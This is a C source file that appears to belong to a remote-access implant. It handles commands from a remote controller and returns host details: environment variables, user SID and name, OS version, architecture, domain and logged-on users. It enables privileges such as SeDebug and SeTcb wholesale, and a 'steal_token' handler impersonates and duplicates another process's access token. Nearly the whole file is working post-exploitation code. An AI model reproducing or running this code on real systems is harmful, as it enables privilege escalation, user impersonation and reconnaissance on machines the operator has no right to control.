#include "precomp.h"

#ifdef _WIN32
#include <Sddl.h>
#include <Lm.h>

typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);

#else
#include <sys/utsname.h>
#endif

#pragma comment(lib, "netapi32.lib")

/*!
 * @brief Add an environment variable / value pair to a response packet.
 * @param response The \c Response packet to add the values to.
 * @param envVar The name of the environment variable to add.
 * @param envVal The value of the environment.
 */
VOID add_env_pair(Packet *response, char * envVar, char *envVal)
{
	Tlv entries[2] = { 0 };

	if (envVal)
	{
		entries[0].header.type = TLV_TYPE_ENV_VARIABLE;
		entries[0].header.length = (DWORD)strlen(envVar) + 1;
		entries[0].buffer = (PUCHAR)envVar;

		entries[1].header.type = TLV_TYPE_ENV_VALUE;
		entries[1].header.length = (DWORD)strlen(envVal) + 1;
		entries[1].buffer = (PUCHAR)envVal;

		packet_add_tlv_group(response, TLV_TYPE_ENV_GROUP, entries, 2);
	}
	else
	{
		dprintf("[ENV] No value found for %s", envVar);
	}
}

/*!
 * @brief Expand a given set of environment variables.
 * @param remote Pointer to the \c Remote instance making the request.
 * @param packet Pointer to the \c Request packet.
 * @remarks This will return a hash of the list of environment variables
 *          and their values, as requested by the caller.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTlvIndex = 0;
	Tlv envTlv;
	char* pEnvVarStart;
	char* pEnvVarEnd;

	do
	{
		while (ERROR_SUCCESS == packet_enum_tlv(packet, dwTlvIndex++, TLV_TYPE_ENV_VARIABLE, &envTlv))
		{
			pEnvVarStart = (char*)envTlv.buffer;

			dprintf("[ENV] Processing: %s", pEnvVarStart);

			// skip any '%' or '$' if they were specified.
			while (*pEnvVarStart != '\0' && (*pEnvVarStart == '$' || *pEnvVarStart == '%'))
			{
				++pEnvVarStart;
			}

			dprintf("[ENV] pEnvStart: %s", pEnvVarStart);

			pEnvVarEnd = pEnvVarStart;

			// if we're on windows, the caller might have passed in '%' at the end, so remove that
			// if it's there.
			while (*pEnvVarEnd != '\0')
			{
				if (*pEnvVarEnd == '%')
				{
					// terminate it here instead
					*pEnvVarEnd = '\0';
					break;
				}
				++pEnvVarEnd;
			}

			dprintf("[ENV] Final env var: %s", pEnvVarStart);

			// grab the value of the variable and stick it in the response.
			add_env_pair(response, pEnvVarStart, getenv(pEnvVarStart));

			dprintf("[ENV] Env var added");
		}
	} while (0);

	dprintf("[ENV] Transmitting response.");
	packet_transmit_response(dwResult, remote, response);

	dprintf("[ENV] done.");
	return dwResult;
}

#ifdef _WIN32
/*
 * @brief Get the token information for the current thread/process.
 * @param pTokenUser Buffer to receive the token data.
 * @param dwBufferSize Size of the buffer that will receive the token data.
 * @returns Indication of success or failure.
 */
DWORD get_user_token(LPVOID pTokenUser, DWORD dwBufferSize)
{
	DWORD dwResult = 0;
	DWORD dwReturnedLength = 0;
	HANDLE hToken;

	do
	{
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			{
				BREAK_ON_ERROR("[TOKEN] Failed to get a valid token for thread/process.");
			}
		}

		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
		{
			BREAK_ON_ERROR("[TOKEN] Failed to get token information for thread/process.");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}

/*
 * @brief Get the SID of the current process/thread.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
{
	DWORD dwResult;
	BYTE tokenUserInfo[4096];
	LPSTR pSid = NULL;
	Packet *pResponse = packet_create_response(pRequest);

	do
	{
		dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo));
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		if (!ConvertSidToStringSidA(((TOKEN_USER*)tokenUserInfo)->User.Sid, &pSid))
		{
			BREAK_ON_ERROR("[GETSID] Unable to convert current SID to string");
		}

	} while (0);

	if (pSid != NULL)
	{
		packet_add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
		LocalFree(pSid);
	}

	packet_transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * @brief Get the UID of the current process/thread.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 * @remark This is a helper function that does the grunt work
 *         for getting the user details which is used in a few
 *         other locations.
 */
DWORD populate_uid(Packet* pResponse)
{
	DWORD dwResult;
	CHAR cbUsername[1024], cbUserOnly[512], cbDomainOnly[512];
	BYTE tokenUserInfo[4096];
	DWORD dwUserSize = sizeof(cbUserOnly), dwDomainSize = sizeof(cbDomainOnly);
	DWORD dwSidType = 0;

	memset(cbUsername, 0, sizeof(cbUsername));
	memset(cbUserOnly, 0, sizeof(cbUserOnly));
	memset(cbDomainOnly, 0, sizeof(cbDomainOnly));

	do
	{
		if ((dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo))) != ERROR_SUCCESS)
		{
			dprintf("[POPUID] unable to get user token");
			break;
		}

		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
		{
			BREAK_ON_ERROR("[GETUID] Failed to lookup the account SID data");
		}

 		// Make full name in DOMAIN\USERNAME format
		_snprintf(cbUsername, 512, "%s\\%s", cbDomainOnly, cbUserOnly);
		cbUsername[511] = '\0';

		packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, cbUsername);

		dwResult = EXIT_SUCCESS;
	} while (0);

	return dwResult;
}
#endif

/*
 * @brief Get the user name of the current process/thread.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
{
	Packet *pResponse = packet_create_response(pPacket);
	DWORD dwResult = ERROR_SUCCESS;

#ifdef _WIN32
	dwResult = populate_uid(pResponse);
#else
	CHAR info[512];
	uid_t ru, eu, su;
	gid_t rg, eg, sg;

	ru = eu = su = rg = eg = sg = 31337;

	getresuid(&ru, &eu, &su);
	getresgid(&rg, &eg, &sg);

	snprintf(info, sizeof(info)-1, "uid=%d, gid=%d, euid=%d, egid=%d, suid=%d, sgid=%d", ru, rg, eu, eg, su, sg);
	packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, info);
#endif

	// Transmit the response
	packet_transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * @brief Drops an existing thread token.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
{
	Packet* pResponse = packet_create_response(pPacket);
	DWORD dwResult = ERROR_SUCCESS;

#ifdef _WIN32
	core_update_thread_token(pRemote, NULL);
	dwResult = populate_uid(pResponse);
#else
	dwResult = ERROR_NOT_SUPPORTED;
#endif

	// Transmit the response
	packet_transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * sys_getprivs
 * ----------
 *
 * Obtains as many privileges as possible
 * Based on the example at http://nibuthomas.com/tag/openprocesstoken/
 */
DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
#ifdef _WIN32
	DWORD res = ERROR_SUCCESS;
	HANDLE token = NULL;
	int x;
	TOKEN_PRIVILEGES priv = {0};
	LPCTSTR privs[] = {
		SE_DEBUG_NAME,
		SE_TCB_NAME,
		SE_CREATE_TOKEN_NAME,
		SE_ASSIGNPRIMARYTOKEN_NAME,
		SE_LOCK_MEMORY_NAME,
		SE_INCREASE_QUOTA_NAME,
		SE_UNSOLICITED_INPUT_NAME,
		SE_MACHINE_ACCOUNT_NAME,
		SE_SECURITY_NAME,
		SE_TAKE_OWNERSHIP_NAME,
		SE_LOAD_DRIVER_NAME,
		SE_SYSTEM_PROFILE_NAME,
		SE_SYSTEMTIME_NAME,
		SE_PROF_SINGLE_PROCESS_NAME,
		SE_INC_BASE_PRIORITY_NAME,
		SE_CREATE_PAGEFILE_NAME,
		SE_CREATE_PERMANENT_NAME,
		SE_BACKUP_NAME,
		SE_RESTORE_NAME,
		SE_SHUTDOWN_NAME,
		SE_AUDIT_NAME,
		SE_SYSTEM_ENVIRONMENT_NAME,
		SE_CHANGE_NOTIFY_NAME,
		SE_REMOTE_SHUTDOWN_NAME,
		SE_UNDOCK_NAME,
		SE_SYNC_AGENT_NAME,
		SE_ENABLE_DELEGATION_NAME,
		SE_MANAGE_VOLUME_NAME,
		0
	};

	do
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))  {
			res = GetLastError();
			break;
		}

		for (x = 0; privs[x]; ++x)
		{
			memset(&priv, 0, sizeof(priv));
			LookupPrivilegeValue(NULL, privs[x], &priv.Privileges[0].Luid);
			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if(AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0)) {
				if(GetLastError() == ERROR_SUCCESS) {
					packet_add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
				}
			} else {
				dprintf("[getprivs] Failed to set privilege %s (%u)", privs[x], GetLastError());
			}
		}
	} while (0);

	if(token)
		CloseHandle(token);
#else
	DWORD res = ERROR_NOT_SUPPORTED;
#endif
	// Transmit the response
	packet_transmit_response(res, remote, response);

	return res;
}

/*
 * sys_steal_token
 * ----------
 *
 * Steals the primary token from an existing process
 */
DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
#ifdef _WIN32
	HANDLE hToken = NULL;
	HANDLE hProcessHandle = NULL;
	HANDLE hDupToken = NULL;
	DWORD dwPid;

	do
	{
		// Get the process identifier that we're attaching to, if any.
		dwPid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);

		if (!dwPid)
		{
			dprintf("[STEAL-TOKEN] invalid pid");
			dwResult = -1;
			break;
		}

		hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);

		if (!hProcessHandle)
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!OpenProcessToken(hProcessHandle, TOKEN_ALL_ACCESS, &hToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!ImpersonateLoggedOnUser(hToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
			break;
		}

		dprintf("[STEAL-TOKEN] so far so good, updating thread token");
		core_update_thread_token(remote, hDupToken);

		dprintf("[STEAL-TOKEN] populating UID");
		dwResult = populate_uid(response);
	} while (0);

	if (hProcessHandle)
	{
		CloseHandle(hProcessHandle);
	}

	if (hToken)
	{
		CloseHandle(hToken);
	}
#else
	dwResult = ERROR_NOT_SUPPORTED;
#endif
	// Transmit the response
	packet_transmit_response(dwResult, remote, response);

	return dwResult;
}

#ifdef _WIN32
DWORD add_windows_os_version(Packet** packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	CHAR buffer[512] = { 0 };

	do
	{
		HMODULE hNtdll = GetModuleHandleA("ntdll");
		if (hNtdll == NULL)
		{
			BREAK_ON_ERROR("[SYSINFO] Failed to load ntoskrnl");
		}

		PRtlGetVersion pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL)
		{
			BREAK_ON_ERROR("[SYSINFO] Couldn't find RtlGetVersion in ntoskrnl");
		}

		OSVERSIONINFOEXW v = { 0 };
		v.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

		if (0 != pRtlGetVersion(&v))
		{
			dwResult = ERROR_INVALID_DLL;
			dprintf("[SYSINFO] Unable to get OS version with RtlGetVersion");
			break;
		}

		dprintf("[VERSION] Major   : %u", v.dwMajorVersion);
		dprintf("[VERSION] Minor   : %u", v.dwMinorVersion);
		dprintf("[VERSION] Build   : %u", v.dwBuildNumber);
		dprintf("[VERSION] Maint   : %S", v.szCSDVersion);
		dprintf("[VERSION] Platform: %u", v.dwPlatformId);
		dprintf("[VERSION] Type    : %hu", v.wProductType);
		dprintf("[VERSION] SP Major: %hu", v.wServicePackMajor);
		dprintf("[VERSION] SP Minor: %hu", v.wServicePackMinor);
		dprintf("[VERSION] Suite   : %hu", v.wSuiteMask);

		CHAR* osName = NULL;

		if (v.dwMajorVersion == 3)
		{
			osName = "Windows NT 3.51";
		}
		else if (v.dwMajorVersion == 4)
		{
			if (v.dwMinorVersion == 0 && v.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
			{
				osName = "Windows 95";
			}
			else if (v.dwMinorVersion == 10)
			{
				osName = "Windows 98";
			}
			else if (v.dwMinorVersion == 90)
			{
				osName = "Windows ME";
			}
			else if (v.dwMinorVersion == 0 && v.dwPlatformId == VER_PLATFORM_WIN32_NT)
			{
				osName = "Windows NT 4.0";
			}
		}
		else if (v.dwMajorVersion == 5)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = "Windows 2000";
			}
			else if (v.dwMinorVersion == 1)
			{
				osName = "Windows XP";
			}
			else if (v.dwMinorVersion == 2)
			{
				osName = "Windows .NET Server";
			}
		}
		else if (v.dwMajorVersion == 6)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows Vista" : "Windows 2008";
			}
			else if (v.dwMinorVersion == 1)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 7" : "Windows 2008 R2";
			}
			else if (v.dwMinorVersion == 2)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 8" : "Windows 2012";
			}
			else if (v.dwMinorVersion == 3)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 8.1" : "Windows 2012 R2";
			}
		}
		else if (v.dwMajorVersion == 10)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016 Tech Preview";
			}
		}

		if (!osName)
		{
			osName = "Unknown";
		}

		if (wcslen(v.szCSDVersion) > 0)
		{
			_snprintf(buffer, sizeof(buffer)-1, "%s (Build %lu, %S).", osName, v.dwBuildNumber, v.szCSDVersion);
		}
		else
		{
			_snprintf(buffer, sizeof(buffer)-1, "%s (Build %lu).", osName, v.dwBuildNumber);
		}

		dprintf("[VERSION] Version set to: %s", buffer);
		packet_add_tlv_string(*packet, TLV_TYPE_OS_NAME, buffer);
	} while (0);

	return dwResult;
}
#endif

/*
 * sys_sysinfo
 * ----------
 *
 * Get system information such as computer name and OS version
 */
DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
#ifdef _WIN32
	CHAR computer[512], buf[512], * osArch = NULL, * osWow = NULL;
	DWORD res = ERROR_SUCCESS;
	DWORD size = sizeof(computer);
	HMODULE hKernel32;

	memset(computer, 0, sizeof(computer));
	memset(buf, 0, sizeof(buf));

	do
	{
		// Get the computer name
		if (!GetComputerName(computer, &size))
		{
			res = GetLastError();
			break;
		}

		packet_add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
		add_windows_os_version(&response);

		// sf: we dynamically retrieve GetNativeSystemInfo & IsWow64Process as NT and 2000 dont support it.
		hKernel32 = LoadLibraryA("kernel32.dll");
		if (hKernel32)
		{
			typedef void (WINAPI * GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
			typedef BOOL(WINAPI * ISWOW64PROCESS)(HANDLE, PBOOL);
			GETNATIVESYSTEMINFO pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
			ISWOW64PROCESS pIsWow64Process = (ISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process");
			if (pGetNativeSystemInfo)
			{
				SYSTEM_INFO SystemInfo;
				pGetNativeSystemInfo(&SystemInfo);
				switch (SystemInfo.wProcessorArchitecture)
				{
				case PROCESSOR_ARCHITECTURE_AMD64:
					osArch = "x64";
					break;
				case PROCESSOR_ARCHITECTURE_IA64:
					osArch = "IA64";
					break;
				case PROCESSOR_ARCHITECTURE_INTEL:
					osArch = "x86";
					break;
				default:
					break;
				}
			}
			if (pIsWow64Process)
			{
				BOOL bIsWow64 = FALSE;
				pIsWow64Process(GetCurrentProcess(), &bIsWow64);
				if (bIsWow64)
				{
					osWow = " (Current Process is WOW64)";
				}
			}
		}
		// if we havnt set the arch it is probably because we are on NT/2000 which is x86
		if (!osArch)
		{
			osArch = "x86";
		}

		if (!osWow)
		{
			osWow = "";
		}

		_snprintf(buf, sizeof(buf) - 1, "%s%s", osArch, osWow);
		dprintf("[SYSINFO] Arch set to: %s", buf);
		packet_add_tlv_string(response, TLV_TYPE_ARCHITECTURE, buf);

		if (hKernel32)
		{
			char * ctryname = NULL, *langname = NULL;
			typedef LANGID(WINAPI * GETSYSTEMDEFAULTLANGID)(VOID);
			GETSYSTEMDEFAULTLANGID pGetSystemDefaultLangID = (GETSYSTEMDEFAULTLANGID)GetProcAddress(hKernel32, "GetSystemDefaultLangID");
			if (pGetSystemDefaultLangID)
			{
				LANGID langId = pGetSystemDefaultLangID();

				int len = GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, 0, 0);
				if (len > 0)
				{
					ctryname = (char *)malloc(len);
					GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, ctryname, len);
				}

				len = GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, 0, 0);
				if (len > 0)
				{
					langname = (char *)malloc(len);
					GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, langname, len);
				}
			}

			if (!ctryname || !langname)
			{
				_snprintf(buf, sizeof(buf)-1, "Unknown");
			}
			else
			{
				_snprintf(buf, sizeof(buf)-1, "%s_%s", langname, ctryname);
			}

			packet_add_tlv_string(response, TLV_TYPE_LANG_SYSTEM, buf);

			if (ctryname)
			{
				free(ctryname);
			}

			if (langname)
			{
				free(langname);
			}
		}

		LPWKSTA_INFO_102 localSysinfo = NULL;

		if (NetWkstaGetInfo(NULL, 102, (LPBYTE *)&localSysinfo) == NERR_Success)
		{
			char *domainName = wchar_to_utf8(localSysinfo->wki102_langroup);
			packet_add_tlv_string(response, TLV_TYPE_DOMAIN, (LPCSTR)domainName);
			packet_add_tlv_uint(response, TLV_TYPE_LOGGED_ON_USER_COUNT, localSysinfo->wki102_logged_on_users);
			free(domainName);
		}
		else
		{
			dprintf("[CONFIG] Failed to get local system info for logged on user count / domain");
		}
	} while (0);
#else
	CHAR os[512];

	DWORD res = ERROR_SUCCESS;

	do {
		struct utsname utsbuf;
		if (uname(&utsbuf) == -1) {
			res = GetLastError();
			break;
		}

		snprintf(os, sizeof(os), "%s %s %s %s (%s)",
			utsbuf.sysname, utsbuf.nodename, utsbuf.release,
			utsbuf.version, utsbuf.machine);

		packet_add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, utsbuf.nodename);
		packet_add_tlv_string(response, TLV_TYPE_OS_NAME, os);
		packet_add_tlv_string(response, TLV_TYPE_ARCHITECTURE, utsbuf.machine);

	} while(0);

#endif
	// Transmit the response
	packet_transmit_response(res, remote, response);

	return res;
}


/*
 * sys_config_rev2self
 *
 * Calls RevertToSelf()
 */
DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult    = ERROR_SUCCESS;
	Packet * response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			dwResult = ERROR_INVALID_HANDLE;
			break;
		}

		core_update_thread_token(remote, NULL);

		core_update_desktop(remote, -1, NULL, NULL);

		if (!RevertToSelf())
			dwResult = GetLastError();

	} while(0);

	if (response)
		packet_transmit_response(dwResult, remote, response);

#else
	DWORD dwResult = ERROR_NOT_SUPPORTED;
#endif

	return dwResult;
}
